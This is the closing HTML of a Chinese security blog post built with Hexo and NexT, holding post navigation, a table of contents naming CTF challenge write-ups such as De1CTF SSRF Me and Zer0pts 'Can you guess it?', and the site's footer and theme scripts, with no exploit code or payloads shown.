    <a href="/2023/07/16/preg-replace-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="prev" title="preg_replace /e模式下的代码执行漏洞">
      <i class="fa fa-chevron-left"></i> preg_replace /e模式下的代码执行漏洞
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/07/25/Xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" rel="next" title="Xml外部实体注入漏洞">
      Xml外部实体注入漏洞 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83-1"><span class="nav-number">1.</span> <span class="nav-text">[GXYCTF2019]禁止套娃 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#De1CTF-2019-SSRF-Me"><span class="nav-number">2.</span> <span class="nav-text">[De1CTF 2019]SSRF Me</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB"><span class="nav-number">2.1.</span> <span class="nav-text">hash长度扩展攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="nav-number">2.2.</span> <span class="nav-text">字符串拼接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Zer0pts2020-Can-you-guess-it"><span class="nav-number">3.</span> <span class="nav-text">[Zer0pts2020]Can you guess it?</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">3.1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SERVER-%E2%80%98PHP-SELF%E2%80%99"><span class="nav-number">3.1.1.</span> <span class="nav-text">$_SERVER[‘PHP_SELF’]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#basename"><span class="nav-number">3.1.2.</span> <span class="nav-text">basename()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%8F%AF%E6%98%BE%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99"><span class="nav-number">3.1.3.</span> <span class="nav-text">不可显字符绕过正则</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">3.2.</span> <span class="nav-text">解题</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">lwq</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lwq</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
